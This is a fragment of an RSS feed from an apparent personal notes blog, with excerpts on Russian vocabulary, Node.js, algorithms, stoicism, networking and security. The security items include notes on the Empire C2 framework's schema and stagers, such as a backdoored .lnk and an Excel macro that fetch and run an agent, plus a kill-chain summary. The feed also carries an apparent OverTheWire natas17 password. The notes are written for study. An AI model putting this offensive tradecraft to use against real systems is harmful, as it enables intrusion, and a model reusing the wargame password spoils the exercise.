Plurals are built with infinitive + &amp;lsquo;и&amp;rsquo;/&amp;lsquo;ь&amp;rsquo;</description></item><item><title>Javascript</title><link>https://www.dinudev.com/post/javascript/</link><pubDate>Mon, 02 Mar 2020 13:14:00 +0200</pubDate><guid>https://www.dinudev.com/post/javascript/</guid><description>Node: core packages: console(print to stdout/stderr): time(&amp;quot;label&amp;quot;) / timeLog(&amp;quot;label&amp;quot;) / timeEnd(&amp;quot;label&amp;quot;): time spent error(&amp;quot;string&amp;quot;) / warn(&amp;quot;string&amp;quot;): print to stderr trace(&amp;quot;string&amp;quot;): print string and debug trace to current position in the code readline(read from stdin line by line): events: &amp;ldquo;close&amp;rdquo; &amp;ldquo;line&amp;rdquo;: triggers on &amp;ldquo;\n&amp;rdquo;, &amp;ldquo;\r&amp;rdquo;, &amp;ldquo;\r\n&amp;rdquo; createInstance({input: &amp;lt;input.stream&amp;gt;, output: &amp;lt;output.stream&amp;gt;}) if you have 30 projects that all require package randomPackage, you get 30 copies of randomPackage, one for each node_modules of each project(WTF?</description></item><item><title>RE and Malware RE</title><link>https://www.dinudev.com/post/re_malware_re/</link><pubDate>Mon, 02 Mar 2020 13:14:00 +0200</pubDate><guid>https://www.dinudev.com/post/re_malware_re/</guid><description>For reverse engineering: Practical Reverse Engineering - Bruce Dang Reversing Secrets Engineering - Eldad Eilam The IDA Pro Book - Chris Eagle For malware analysis and malware techniques: Practical Malware Analysis - Michael Sikorski, Andrew Honig Malware Analyst&amp;rsquo;s Cookbook - Michael Ligh, Steven Adair, Blake Hartstein, Matthew Richard The Art of Memory Forensics - Michael Hale Ligh, Andrew Case, Jamie Levy, AAron Walters For programming: Complete Reference C and Complete Reference C++ NASM Manual Intel Software Developer Manual (http://www.</description></item><item><title>Russian Noun Pronunciation</title><link>https://www.dinudev.com/post/russian_dictionary/</link><pubDate>Mon, 02 Mar 2020 13:14:00 +0200</pubDate><guid>https://www.dinudev.com/post/russian_dictionary/</guid><description> ru_word ru_pronunciation en_translation ru_plural ru_plural_pronunciation gender день dieni day/afternoon дени dieni m путь puti path m рубль rubli rouble m камень camieni stone m родитель raditieli parents m уровень uravieni level m лагерь lagheri camp m корабль carabli ship m конь coni horse/knight(in chess) m господь gaspoti god/the lord m медведь miedvieti bear медведи miedviedi m гость gosti guests m парень parieni boy/fellow/guy m король caroli king m царь țari tzar/czar/king/ruler m зверь zvieri wild animal/beast m житель jitieli inhabitant/resident/dweller m секретарь siecrietari secretary m учитель ucitieli teacher/instructor m писатель pisatieli writer m читатель citatieli reader m ночь nocha night f очень приятно oceni priatna pleased(very pleasant) tot meet you кровать cravati bed f дверь dvieri door двери dvieri f кравать cravati bed f кровь crofi blood f вещь vieși thing/stuff/matter f помощь pomosi help/assistance/support/relief/aid f мышь mâiș mouse мыши mâiși f мать mati mother f жизнь jizni life f часть chasti part/share/department f мысль mâsli thought/ideea f смерть smierti death f власть vlasti power f любовь liubofi love f возможность vazmojnasti possibility f грудь grudi breast/chest f огонь agoni fire f очередь ochierieti line/queue/turn f боль boli pain f речь riechi speech f связь sviazi bond/tie/connection/relation f цель țieli goal/object/target f знать znati aristocracy/nobility/the elite f память pamiati memory f ладонь ladoni palm f болезнь baliezni disease f роль roli role f дочь doci daughter f тень tieni shadow f лошадь loșati horse f площадь ploșati square/area f область oblasti oblast/province/field f деятельность dieiatielinăsti activiti f степень stiepieni degree/extent/power(in mathematics) f пыиль pâili dust/sprai f даль dali distance(in poetry)/long way off f председатель priedsiedatieli chairman/president m честь ciesti honour/regard/respect f кость costi bone f личность lichinăsti personality/person f скорость scorosti speed f</description></item><item><title>CRS File Format</title><link>https://www.dinudev.com/post/crs_file_format/</link><pubDate>Sun, 01 Mar 2020 18:32:00 +0200</pubDate><guid>https://www.dinudev.com/post/crs_file_format/</guid><description>Goals: learn about file formats obfuscate files File format: encrypt the raw data from the file and write to an image(RAW) compute header items dynamic addresses based on RAW size: header items addresses should not be linked in any way (if you know one address you should not be able to deduce/compute the others)</description></item><item><title>Computer Science</title><link>https://www.dinudev.com/post/cs/</link><pubDate>Sun, 01 Mar 2020 17:22:00 +0200</pubDate><guid>https://www.dinudev.com/post/cs/</guid><description>General: everything that is tedious is error-prone try to design your types so that values are guaranteed to be valid: hide the representation provide a constructor that creates only valid objects design all member functions to expect valid values and leave only valid values behind when they return a rule for what constitues an valid values is an invariant types for objects in main memory is the same as formats for files on disk Interface construction rules: keep interfaces complete keep interfaces minimal provide constructors support copying(or prohibit it) use types to provide good argument checking identify nonmodifying member functions free all resources in the destructor Attributes of a program: should produce the desired results for all legal inputs should give reasonable error messages for all ilegal imputs need not worry about misbehaving hardware need not worry about misbehaving system software is allowed to terminate after finding an error Approaches to acceptable software: organize software to minimize errors eliminate most of the errors we made through debugging and testing make sure the remaining errors are not serious Sources of errors: Poor specification: if we are not specific of the software functionality we can&amp;rsquo;t asses the &amp;ldquo;dark corners&amp;rdquo; and make sure all cases are handled Incomplete programs: know when you handled all the cases Unexpected arguments Unexpected input Unexpected state Logical Errors: code that simply does not do what is supposed to do Types of errors: compile-time: syntax errors type errors(values assigned to variables of the wrong tipe) non-errors(area(10, -7), a rectangle can&amp;rsquo;t have a negative width, but the pc can&amp;rsquo;t know that) link-time: every function in the program must be declared with exactly the same type in every translation unit in which is used every function must be defined exactly once in the program run-time logic errors Debugging: how would i know if the program actually worked correctly?</description></item><item><title>Empire Framework Notes</title><link>https://www.dinudev.com/post/empire/</link><pubDate>Wed, 26 Feb 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/empire/</guid><description>setup: based on some distro detection techniques, install prerequisites and powershell(.dotnetcore) works with python 2 and/or 3 setup database from setup/setup_database.py: sqlite3 setup users and passwords config: staging_key: text install_path: text ip_whitelist: text ip_blacklist: text autorun_command: text autorun_data: text rootuser: boolean api_username: text api_password: text api_current_token: text api_permanent_token: text obfuscate: integer obfuscate_command: text agents: id:integer session_id:text listener:text name:text language:text language_version:text delay:integer jitter:real external_ip:text internal_ip:text username:text high_integrity:integer process_name:text process_id:text hostname:text os_details:text session_key:text nonce:text checkin_time:text lastseen_time:text parent:text children:text servers:text profile:text functions:text kill_date:text working_hours:text lost_limit:integer taskings:text results:tex listeners: id:integer name:text module:text listener_type:text listener_category:text enabled:boolean options:blo credentials: id:integer credtype:text domain:text username:text password:text host:text os:text sid:text notes:tex taskings: id:integer data:text agent:text results: id:integer data:text agent:text reporting: id:integer name:text event_type:text message:text time_stamp:text taskID:integer generate a self-signed certificate install python req: network tools setup tools cryptographic tools iptools(manipulate ipv4/ip6 addresses) pydispatcher(signal dispatching mechanism) web framework(flask/jinja) pe/macho header readers dropbox(api wrapper) pyOpenSSL(openssl wrapper) pyinstaller(make an exe) zlib_wrapper netifaces(portable network interface information) pyminifier(minifier,obfuscator,compressor) xlutils(work with excel files) architecture: structure: listeners: pivot: open a port on an agent that acts as a proxy to a listener hop: proxy that is a single php file hosted somewhere foreign: stagers(.</description></item><item><title>Random Notes</title><link>https://www.dinudev.com/post/random_notes/</link><pubDate>Mon, 24 Feb 2020 15:44:00 +0200</pubDate><guid>https://www.dinudev.com/post/random_notes/</guid><description>Network upgrade: Before:
3.65 dl 1.74 up Connection failed 0.25 dl 0.01 up 0.56 dl 0.00 up 0.12 dl 0.00 up After
4.91 dl 6.61 up 10.1 dl 6.09 up 9.08 dl 7.44 up 16.4 dl 7.04 up 11.9 dl 6.03 up Some algorithm: get a directory and a hash in directory there can be 0 or more children if there are more than 0 children get the hash keys of the children iterate through the keys truncate the curent key to the hash size and compare them if they are the same, if the child is a file return the file path, if the child is a directory, goroutine recursively else go to the next if no match is found, return nil How to be as pompous as you can: only the awake may think seeing is for open eyes cognition is a lie i dream the world awake dreaming is a vestige sleep is pretend a dream is a cowardly thought sleep is not civilized the mind is a tyrant this is your time now i will never dream again stay out of your bedrom there is work to be done dreams are just screaming with pictures the pure of mind do not slumber no good thought follows instinct the lie of sleep seeks many vessels we are our own gods let cognizance nourish itself logic is the final burden the primitive mind deserves its nightmares when we sleep we die i am an idea thinking itself they are no faces the subconscious is a parasite dreaming is a cancer on the face of sleep they follow night to bleed dreams your home has another door unconsciousness is a threat we are not meant to dream you owe the messenger what is true unmakes the false sleep is a scavenger this message will repeat until there are none to read it Set &amp;ldquo;offline&amp;rdquo; in lol chat: RADS &amp;gt; Projects &amp;gt; lol_air_client_config_[your server here] &amp;gt; releases &amp;gt; 0.</description></item><item><title>Stoicism</title><link>https://www.dinudev.com/post/stoicism/</link><pubDate>Mon, 24 Feb 2020 11:29:00 +0200</pubDate><guid>https://www.dinudev.com/post/stoicism/</guid><description>Stages of stoicism: Early: Zeno of Citium(founder;330bce): stoicism comes from the parto of the agora zeno and it&amp;rsquo;s followers would meet and discuss philosophy, Painted Stoa(covered colonnades), first named Zenonians, then named Stoics influenced by cynics, plato, megarian Aristo of Chios(pupil of zeno): focused on ethics eavily influenced by the cynics Cleantes of Assos(turkey): head of school after Zeno known for a religios ode to Zeus might have been his commentaries on Heraclitus physics that influenced Stoic physics Chrysippus of Soli(cicilia, asia minor;230bce as headmaster;205bce death): third head of the Stoic school the great unifier, systematised the Stoic philosophy of its predecessors middle(these started to inspire themselves from other philosophies): Panaetius of Rhodes(185bce - 110bce;head of stoa in 128bce): influenced Cicero influenced by Plato and Aristotle Posidonius of Apamea(siria;135bce - 51bce): Cicero was his pupil polymath contribuing to history, geography, astronomy, meteorology, biology and anthropology famous contributions in psychology late(first hand sources are available): these stoics lose interest in physics and logic and focus on practical ethics Seneca: leters to St.</description></item><item><title>Malware techniques RE</title><link>https://www.dinudev.com/post/malware_techniques_re/</link><pubDate>Sun, 16 Feb 2020 21:18:00 +0200</pubDate><guid>https://www.dinudev.com/post/malware_techniques_re/</guid><description>Smashing the stack: when you make a call, you push the address to return to onto the stack overwrite that address empire: source discontinued but a fork is currently mantained by BC Security: launchers: powershell python stagers: backdoorLnkMacro: backdoor .lnk on desktop that on click will attempt to download and run an empire agent structure: xls file new or with data macro to be injected into the xls xml holds data about empire install, this will be hosted on the c2 behaviour: two-stage macro: stage 1: vbscript that backdoors all the .</description></item><item><title>CCNA 1</title><link>https://www.dinudev.com/post/ccna1/</link><pubDate>Sun, 16 Feb 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/ccna1/</guid><description>CCNA1 required knowledge: What initial settings need setting up? passwords(switch and router) IP addressing(switch and end devices) default gateway(switch and end devices) Navigation &amp;amp;&amp;amp; Access Basic Device Configuration Save Configurations Ports and Addresses Configure IP Addressing Verify Connectivity How network protocols enable devices to access local and remote network resources? How physical layer protocols, services, and network media support communications across data networks? Number base change: decimal binary hexadecimal systems How media access control in the data link layer supports communications across networks?</description></item><item><title>First Http Email - 1991</title><link>https://www.dinudev.com/post/first_http_email_1991/</link><pubDate>Thu, 13 Feb 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/first_http_email_1991/</guid><description>From: timbl@info .cern.ch (Tim Berners-Lee) Newsgroups: alt.hypertext Subject: Re: Qualifiers on Hypertext links&amp;hellip; Message-ID: 6484@cernvax.cern.ch Date: 6 Aug 91 14:56:20 GMT References: 1991Aug2.115241@ardor.enet.dec.com Sender: news@cernvax.cern.ch Lines: 52 In article &amp;lt;1991Aug2.115241@ardor.enet.dec.com&amp;gt; kannan@ardor.enet.dec.com (Nari Kannan) writes: &amp;gt; &amp;gt; Is anyone reading this newsgroup aware of research or development efforts in &amp;gt; the &amp;gt; following areas: &amp;gt; &amp;gt; 1. Hypertext links enabling retrieval from multiple heterogeneous sources of &amp;gt; information? The WorldWideWeb (WWW) project aims to allow links to be made to any information anywhere.</description></item><item><title>Cuckoo Sandbox Notes</title><link>https://www.dinudev.com/post/cuckoo/</link><pubDate>Tue, 11 Feb 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/cuckoo/</guid><description>Structure: CWD is implemented so multiple configurations can work with the same cuckoo install logging is standard python2 logging: INFO(all) DEBUG WARN tries to rise soft a dir is created(&amp;ldquo;pidfiles&amp;rdquo;) that holds the pid with the id of the current cuckoo process (maybe an abstraction layer that merges win/linux process viewpoints?) check if curr version is up to date and warn if not check if dependencies have vulnerabilities/are out of date and warn</description></item><item><title>Special Operations Frameworks</title><link>https://www.dinudev.com/post/specops_methodologies/</link><pubDate>Mon, 10 Feb 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/specops_methodologies/</guid><description>Kill chain(structure of the attack): target identification force dispatch to target,decision and order to attack the target destruction of the target F2T2EA: (it&amp;rsquo;s a chain, because an interruption at any stage can interrupt the entire process)
find: identify the target fix: fix the target&amp;rsquo;s location track: monitor the target&amp;rsquo;s movements target: select and appropiate weapon/asset based on the target engage: apply weapon/asset on target asses: evaluate the effects of the attack Four F&amp;rsquo;s: find the enemy: locate enemy fix the enemy: pin down with suppressing fire fight the enemy: engage in combat or flank finish the enemy: eliminate all the combatants Unified kill chain: initial foothold(compromised system): reconnaissance weaponization delivery social engineering exploitation persistence defense evasion command &amp;amp; control pivoting network propagation(internal network): 9.</description></item><item><title>Data Structures and Algorithms</title><link>https://www.dinudev.com/post/dsa/</link><pubDate>Wed, 08 Jan 2020 11:35:00 +0200</pubDate><guid>https://www.dinudev.com/post/dsa/</guid><description>Foundation: what is an algorithm? why use an algorithm? categories Algorithms: searching:
Binary search: input: sorted list of elements guess the middle number and eliminate half the remaining numbers every time big o(list of n): best avg worst: O(log n) return position of element in list or null sorting:
selection sort: big o: worst: O(n^2) avg: O(n^2) best: O(n^2) merge sort: big o: worst: O(n log n) avg: O(n log n) best: O(n log n) Quicksort: base case recursive case big o: worst: O(n^2) avg: O(n log n) best: O(n log n) Data structures: primitives: int float char compound: Array: runtimes: reading: O(1) insertion: O(n) deletion: O(n) random access contigous spaces in memory to extend you have to find a bigger free space and copy the data there random access is easy, because they are contigous, to access item at index n, BASE + n(based on the fact that n is lower that BASE[MAX]) all elements must be of the same data type Linked list: runtimes: reading: O(n) insertion: O(1) deletion: O(1) deletion is O(1) only if you can access instantly the element sequential access each item holds a pointer to the next item in the list solves arrays problem of contigous memory allocation by randomly asigning one unit of space for every item in the list good if you want to access all the elements of the list at once if you want to access the last, you need to start from the first and go through every one, until you find the searched one hash map: model relations from one item to another an array that uses an hash function to store the values a hash function: for every string value a different number is created for the same string the same number is created, no matter the ammount of calls knows the array size and returns valid indexes (n=array lengt, hash &amp;gt;= 0, hash &amp;lt; n - 1) runtime: worst: insert: O(n) delete: O(n) read: O(n) avg: insert: O(1) delete: O(1) read: O(1) collision solutions: start a linked list at the index with multiple values implement: take into account the load factor: items in htable/total slots in htable at &amp;gt;1 load factor the access time is O(n), multiple values with the same hash resize storage when lf is greater than 0.</description></item><item><title/><link>https://www.dinudev.com/journey/otw_natas17/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas17/</guid><description>XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd</description></item></channel></rss>